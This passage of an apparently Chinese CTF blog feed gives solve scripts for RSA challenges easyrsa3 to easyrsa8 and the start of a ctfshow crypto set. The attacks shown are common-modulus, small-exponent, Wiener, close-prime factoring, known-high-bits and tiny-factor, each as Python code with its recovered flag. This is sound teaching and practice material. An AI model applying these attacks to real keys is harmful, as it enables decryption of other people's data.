class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;m0_bv_hv_sv&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="easyrsa3"><a href="#easyrsa3" class="headerlink" title="easyrsa3"></a>easyrsa3</h3><p>题目：easyrsa3.txt</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 797n &#x3D; 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571c &#x3D; 11157593264920825445770016357141996124368529899750745256684450189070288181107423044846165593218013465053839661401595417236657920874113839974471883493099846397002721270590059414981101686668721548330630468951353910564696445509556956955232059386625725883038103399028010566732074011325543650672982884236951904410141077728929261477083689095161596979213961494716637502980358298944316636829309169794324394742285175377601826473276006795072518510850734941703194417926566446980262512429590253643561098275852970461913026108090608491507300365391639081555316166526932233787566053827355349022396563769697278239577184503627244170930e &#x3D; 521n &#x3D; 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571c &#x3D; 6699274351853330023117840396450375948797682409595670560999898826038378040157859939888021861338431350172193961054314487476965030228381372659733197551597730394275360811462401853988404006922710039053586471244376282019487691307865741621991977539073601368892834227191286663809236586729196876277005838495318639365575638989137572792843310915220039476722684554553337116930323671829220528562573169295901496437858327730504992799753724465760161805820723578087668737581704682158991028502143744445435775458296907671407184921683317371216729214056381292474141668027801600327187443375858394577015394108813273774641427184411887546849<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.cnblogs.com/rainbowcloud/p/10141301.html"><strong>RSA共模攻击</strong></a>：使用相同的模数 N 、不同的公钥，加密同一明文消息</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumn <span class="token operator">=</span> <span class="token number">15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571</span>e1 <span class="token operator">=</span> <span class="token number">797</span>e2 <span class="token operator">=</span> <span class="token number">521</span>c1 <span class="token operator">=</span> <span class="token number">11157593264920825445770016357141996124368529899750745256684450189070288181107423044846165593218013465053839661401595417236657920874113839974471883493099846397002721270590059414981101686668721548330630468951353910564696445509556956955232059386625725883038103399028010566732074011325543650672982884236951904410141077728929261477083689095161596979213961494716637502980358298944316636829309169794324394742285175377601826473276006795072518510850734941703194417926566446980262512429590253643561098275852970461913026108090608491507300365391639081555316166526932233787566053827355349022396563769697278239577184503627244170930</span>c2 <span class="token operator">=</span> <span class="token number">6699274351853330023117840396450375948797682409595670560999898826038378040157859939888021861338431350172193961054314487476965030228381372659733197551597730394275360811462401853988404006922710039053586471244376282019487691307865741621991977539073601368892834227191286663809236586729196876277005838495318639365575638989137572792843310915220039476722684554553337116930323671829220528562573169295901496437858327730504992799753724465760161805820723578087668737581704682158991028502143744445435775458296907671407184921683317371216729214056381292474141668027801600327187443375858394577015394108813273774641427184411887546849</span>s <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>  <span class="token comment"># 扩展欧几里得算法</span>m1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>m2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token punctuation">(</span>m1<span class="token operator">*</span>m2<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;sh4r3_N&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="easyrsa4"><a href="#easyrsa4" class="headerlink" title="easyrsa4"></a>easyrsa4</h3><p>题目：easyrsa4.txt</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 3n &#x3D; 18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761c &#x3D; 150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>低加密指数攻击</strong>：当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">3</span>n <span class="token operator">=</span> <span class="token number">18970053728616609366458286067731288749022264959158403758357985915393383117963693827568809925770679353765624810804904382278845526498981422346319417938434861558291366738542079165169736232558687821709937346503480756281489775859439254614472425017554051177725143068122185961552670646275229009531528678548251873421076691650827507829859299300272683223959267661288601619845954466365134077547699819734465321345758416957265682175864227273506250707311775797983409090702086309946790711995796789417222274776215167450093735639202974148778183667502150202265175471213833685988445568819612085268917780718945472573765365588163945754761</span>c <span class="token operator">=</span> <span class="token number">150409620528139732054476072280993764527079006992643377862720337847060335153837950368208902491767027770946661</span>m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token punctuation">,</span> e<span class="token punctuation">)</span> <span class="token comment"># c开e次根</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;Sm4ll_eee&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="easyrsa5"><a href="#easyrsa5" class="headerlink" title="easyrsa5"></a>easyrsa5</h3><p>题目：easyrsa5.txt</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345n &#x3D; 468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231c &#x3D; 350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>低解密指数攻击</strong>：与低加密指数相同，低解密指数可以加快解密的过程，但是也带来了安全问题。</p><p>rsa-wiener-attack：</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;pablocelayes&#x2F;rsa-wiener-attack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">import</span> RSAwienerHackere <span class="token operator">=</span> <span class="token number">284100478693161642327695712452505468891794410301906465434604643365855064101922252698327584524956955373553355814138784402605517536436009073372339264422522610010012877243630454889127160056358637599704871937659443985644871453345576728414422489075791739731547285138648307770775155312545928721094602949588237119345</span>n <span class="token operator">=</span> <span class="token number">468459887279781789188886188573017406548524570309663876064881031936564733341508945283407498306248145591559137207097347130203582813352382018491852922849186827279111555223982032271701972642438224730082216672110316142528108239708171781850491578433309964093293907697072741538649347894863899103340030347858867705231</span>c <span class="token operator">=</span> <span class="token number">350429162418561525458539070186062788413426454598897326594935655762503536409897624028778814302849485850451243934994919418665502401195173255808119461832488053305530748068788500746791135053620550583421369214031040191188956888321397450005528879987036183922578645840167009612661903399312419253694928377398939392827</span>d <span class="token operator">=</span> RSAwienerHacker<span class="token punctuation">.</span>hack_RSA<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h3 id="easyrsa6"><a href="#easyrsa6" class="headerlink" title="easyrsa6"></a>easyrsa6</h3><p>题目：easyrsa6.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token punctuation">,</span>libnum<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token keyword">from</span> secret <span class="token keyword">import</span> flage <span class="token operator">=</span> <span class="token number">0x10001</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>m <span class="token operator">=</span> libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c ="</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># n = 26737417831000820542131903300607349805884383394154602685589253691058592906354935906805134188533804962897170211026684453428204518730064406526279112572388086653330354347467824800159214965211971007509161988095657918569122896402683130342348264873834798355125176339737540844380018932257326719850776549178097196650971801959829891897782953799819540258181186971887122329746532348310216818846497644520553218363336194855498009339838369114649453618101321999347367800581959933596734457081762378746706371599215668686459906553007018812297658015353803626409606707460210905216362646940355737679889912399014237502529373804288304270563</span><span class="token comment"># c = 18343406988553647441155363755415469675162952205929092244387144604220598930987120971635625205531679665588524624774972379282080365368504475385813836796957675346369136362299791881988434459126442243685599469468046961707420163849755187402196540739689823324440860766040276525600017446640429559755587590377841083082073283783044180553080312093936655426279610008234238497453986740658015049273023492032325305925499263982266317509342604959809805578180715819784421086649380350482836529047761222588878122181300629226379468397199620669975860711741390226214613560571952382040172091951384219283820044879575505273602318856695503917257</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<a href="https://blog.csdn.net/weixin_41603028/article/details/97167312"><strong>RSA因数分解工具yafu</strong></a>：yafu用于自动整数因式分解，在RSA中，当p、q的取值差异过大或过于相近的时候，使用yafu可以快速的把n值分解出p、q值。</p><p><img src="https://z3.ax1x.com/2021/04/09/cUcEfU.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">0x10001</span>n <span class="token operator">=</span> <span class="token number">26737417831000820542131903300607349805884383394154602685589253691058592906354935906805134188533804962897170211026684453428204518730064406526279112572388086653330354347467824800159214965211971007509161988095657918569122896402683130342348264873834798355125176339737540844380018932257326719850776549178097196650971801959829891897782953799819540258181186971887122329746532348310216818846497644520553218363336194855498009339838369114649453618101321999347367800581959933596734457081762378746706371599215668686459906553007018812297658015353803626409606707460210905216362646940355737679889912399014237502529373804288304270563</span>c <span class="token operator">=</span> <span class="token number">18343406988553647441155363755415469675162952205929092244387144604220598930987120971635625205531679665588524624774972379282080365368504475385813836796957675346369136362299791881988434459126442243685599469468046961707420163849755187402196540739689823324440860766040276525600017446640429559755587590377841083082073283783044180553080312093936655426279610008234238497453986740658015049273023492032325305925499263982266317509342604959809805578180715819784421086649380350482836529047761222588878122181300629226379468397199620669975860711741390226214613560571952382040172091951384219283820044879575505273602318856695503917257</span>p <span class="token operator">=</span> <span class="token number">163515803000813412334620775647541652549604895368507102613553057136855632963322853570924931001138446030409251690646645635800254129997200577719209532684847732809399187385176309169421205833279943214621695444496660249881675974141488357432373412184140130503562295159152949524373214358417567189638680209172147385801</span>q <span class="token operator">=</span> <span class="token number">163515803000813412334620775647541652549604895368507102613553057136855632963322853570924931001138446030409251690646645635800254129997200577719209532684847732809399187385176309169421205833279943214621695444496660249881675974141488357432373412184140130503562295159152949524373214358417567189638680209172147385163</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;p&amp;q_4re_t00_c1o5ed&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="easyrsa7"><a href="#easyrsa7" class="headerlink" title="easyrsa7"></a>easyrsa7</h3><p>题目：easyrsa7.txt</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 0x10001p&gt;&gt;128&lt;&lt;128 &#x3D; 0xd1c520d9798f811e87f4ff406941958bab8fc24b19a32c3ad89b0b73258ed3541e9ca696fd98ce15255264c39ae8c6e8db5ee89993fa44459410d30a0a8af700ae3aee8a9a1d6094f8c757d3b79a8d1147e85be34fb260a970a52826c0a92b46cefb5dfaf2b5a31edf867f8d34d2222900000000000000000000000000000000n &#x3D; 0x79e0bf9b916e59286163a1006f8cefd4c1b080387a6ddb98a3f3984569a4ebb48b22ac36dff7c98e4ebb90ffdd9c07f53a20946f57634fb01f4489fcfc8e402865e152820f3e2989d4f0b5ef1fb366f212e238881ea1da017f754d7840fc38236edba144674464b661d36cdaf52d1e5e7c3c21770c5461a7c1bc2db712a61d992ebc407738fc095cd8b6b64e7e532187b11bf78a8d3ddf52da6f6a67c7e88bef5563cac1e5ce115f3282d5ff9db02278859f63049d1b934d918f46353fea1651d96b2ddd874ec8f1e4b9d487d8849896d1c21fb64029f0d6f47e560555b009b96bfd558228929a6cdf3fb6d47a956829fb1e638fcc1bdfad4ec2c3590dea1ed3c &#x3D; 0x1b2b4f9afed5fb5f9876757e959c183c2381ca73514b1918d2f123e386bebe9832835350f17ac439ac570c9b2738f924ef49afea02922981fad702012d69ea3a3c7d1fc8efc80e541ca2622d7741090b9ccd590906ac273ffcc66a7b8c0d48b7d62d6cd6dd4cd75747c55aac28f8be3249eb255d8750482ebf492692121ab4b27b275a0f69b15baef20bf812f3cbf581786128b51694331be76f80d6fb1314d8b280eaa16c767821b9c2ba05dfde5451feef22ac3cb3dfbc88bc1501765506f0c05045184292a75c475486b680f726f44ef8ddfe3c48f75bb03c8d44198ac70e6b7c885f53000654db22c8cee8eb4f65eaeea2da13887aaf53d8c254d2945691<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>题目中已知e、n、c，还有p的高位，可以通过<strong>RSA高位攻击</strong>恢复p，接下来就是常规解题了。</p><p>sagemath工具太大，所以通过在线网站恢复：<a href="https://sagecell.sagemath.org/">https://sagecell.sagemath.org/</a></p><pre class="line-numbers language-none"><code class="language-none">p &#x3D; 0xd1c520d9798f811e87f4ff406941958bab8fc24b19a32c3ad89b0b73258ed3541e9ca696fd98ce15255264c39ae8c6e8db5ee89993fa44459410d30a0a8af700ae3aee8a9a1d6094f8c757d3b79a8d1147e85be34fb260a970a52826c0a92b46cefb5dfaf2b5a31edf867f8d34d2222900000000000000000000000000000000n &#x3D; 0x79e0bf9b916e59286163a1006f8cefd4c1b080387a6ddb98a3f3984569a4ebb48b22ac36dff7c98e4ebb90ffdd9c07f53a20946f57634fb01f4489fcfc8e402865e152820f3e2989d4f0b5ef1fb366f212e238881ea1da017f754d7840fc38236edba144674464b661d36cdaf52d1e5e7c3c21770c5461a7c1bc2db712a61d992ebc407738fc095cd8b6b64e7e532187b11bf78a8d3ddf52da6f6a67c7e88bef5563cac1e5ce115f3282d5ff9db02278859f63049d1b934d918f46353fea1651d96b2ddd874ec8f1e4b9d487d8849896d1c21fb64029f0d6f47e560555b009b96bfd558228929a6cdf3fb6d47a956829fb1e638fcc1bdfad4ec2c3590dea1ed3pbits &#x3D; 1024kbits &#x3D; 128PR.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))f &#x3D; x + px0 &#x3D; f.small_roots(X&#x3D;2 ^ kbits, beta&#x3D;0.4)[0]print(p+int(x0))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/09/cUckkV.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">0x10001</span>n <span class="token operator">=</span> <span class="token number">0x79e0bf9b916e59286163a1006f8cefd4c1b080387a6ddb98a3f3984569a4ebb48b22ac36dff7c98e4ebb90ffdd9c07f53a20946f57634fb01f4489fcfc8e402865e152820f3e2989d4f0b5ef1fb366f212e238881ea1da017f754d7840fc38236edba144674464b661d36cdaf52d1e5e7c3c21770c5461a7c1bc2db712a61d992ebc407738fc095cd8b6b64e7e532187b11bf78a8d3ddf52da6f6a67c7e88bef5563cac1e5ce115f3282d5ff9db02278859f63049d1b934d918f46353fea1651d96b2ddd874ec8f1e4b9d487d8849896d1c21fb64029f0d6f47e560555b009b96bfd558228929a6cdf3fb6d47a956829fb1e638fcc1bdfad4ec2c3590dea1ed3</span>c <span class="token operator">=</span> <span class="token number">0x1b2b4f9afed5fb5f9876757e959c183c2381ca73514b1918d2f123e386bebe9832835350f17ac439ac570c9b2738f924ef49afea02922981fad702012d69ea3a3c7d1fc8efc80e541ca2622d7741090b9ccd590906ac273ffcc66a7b8c0d48b7d62d6cd6dd4cd75747c55aac28f8be3249eb255d8750482ebf492692121ab4b27b275a0f69b15baef20bf812f3cbf581786128b51694331be76f80d6fb1314d8b280eaa16c767821b9c2ba05dfde5451feef22ac3cb3dfbc88bc1501765506f0c05045184292a75c475486b680f726f44ef8ddfe3c48f75bb03c8d44198ac70e6b7c885f53000654db22c8cee8eb4f65eaeea2da13887aaf53d8c254d2945691</span>p <span class="token operator">=</span> <span class="token number">147305526294483975294006704928271118039370615054437206404408410848858740256154476278591035455064149531353089038270283281541411458250950936656537283482331598521457077465891874559349872035197398406708610440618635013091489698011474611145014167945729411970665381793142591665313979405475889978830728651549052207969</span>q <span class="token operator">=</span> n<span class="token operator">//</span>pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;Kn0wn_Hi9h_Bit5&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="easyrsa8"><a href="#easyrsa8" class="headerlink" title="easyrsa8"></a>easyrsa8</h3><p>题目：easyrsa8.zip</p><p>压缩包里有两个文件</p><ul><li><p>flag.enc</p></li><li><p>public.key</p><pre class="line-numbers language-none"><code class="language-none">-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgTlUlVTKPIIMNZGz82fqFxZ3UlgRvFSyYIPIHCJxfSzCsQncqlVyt5QiNoI8b0UhrZesJYexcMdmkb57&#x2F;4OYKphkT8ok5CFIOwE4CPE036NYe9OMh8e3uNp2VceEsF5C14m87sB4YmHe9qMGJwb9wjb9eA7s7+h2HehtD5ZOUeHAEQIDAQAB-----END PUBLIC KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>在kali中用openssl解开公钥n和e</p><pre class="line-numbers language-none"><code class="language-none">openssl rsa -pubin -text -modulus -in warmup -in public.key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/04/09/cUcAYT.png"></p><p>分解n得到p和q，进而求出d，最后得到m</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_OAEPn <span class="token operator">=</span> <span class="token number">0x39549554ca3c820c3591b3f367ea171677525811bc54b26083c81c22717d2cc2b109dcaa5572b7942236823c6f4521ad97ac2587b170c76691be7bff83982a98644fca24e421483b013808f134dfa3587bd38c87c7b7b8da7655c784b05e42d789bceec0786261def6a3062706fdc236fd780eecefe8761de86d0f964e51e1c011</span>e <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">97</span>q <span class="token operator">=</span> <span class="token number">106249972159566919549855203174197828387397831115262336234662051342543151219702510584956705611794290291345944183845955839244363030579896461607496959399297130227066841321473005074379950936513608503266587950271044991876848389878395867601515004796212227929894460104645781488319246866661398816686697306692491058609</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">)</span>privatekey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span>rsa <span class="token operator">=</span> PKCS1_OAEP<span class="token punctuation">.</span>new<span class="token punctuation">(</span>privatekey<span class="token punctuation">)</span>m <span class="token operator">=</span> rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.enc"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;p_1s_5mall_num6er&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow——crypto</title>
      <link href="posts/20210216.html"/>
      <url>posts/20210216.html</url>
      
        <content type="html"><![CDATA[<p>ctfshow部分crypto题目</p><span id="more"></span><h3 id="密码学签到"><a href="#密码学签到" class="headerlink" title="密码学签到"></a>密码学签到</h3><p>题目：}wohs.ftc{galf</p><p>hint：倒序</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;ctf.show&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h3><p>题目：crypto2.txt</p><p>jjencode编码，复制到控制台然后回车</p><p><img src="https://s3.ax1x.com/2021/02/16/ygp5fH.png"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;3e858ccd79287cfe8509f15a71b4c45d&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h3><p>题目：crypto3.txt</p><p>aaencode编码，复制到控制台然后回车</p><p><img src="https://s3.ax1x.com/2021/02/16/ygp4te.png"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;js_da_fa_hao&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h3><p>题目：</p><pre class="line-numbers language-none"><code class="language-none">p&#x3D;447685307 q&#x3D;2037 e&#x3D;17提交flag&#123;d&#125;即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2p <span class="token operator">=</span> <span class="token number">447685307</span>q <span class="token operator">=</span> <span class="token number">2037</span>e <span class="token operator">=</span> <span class="token number">17</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code 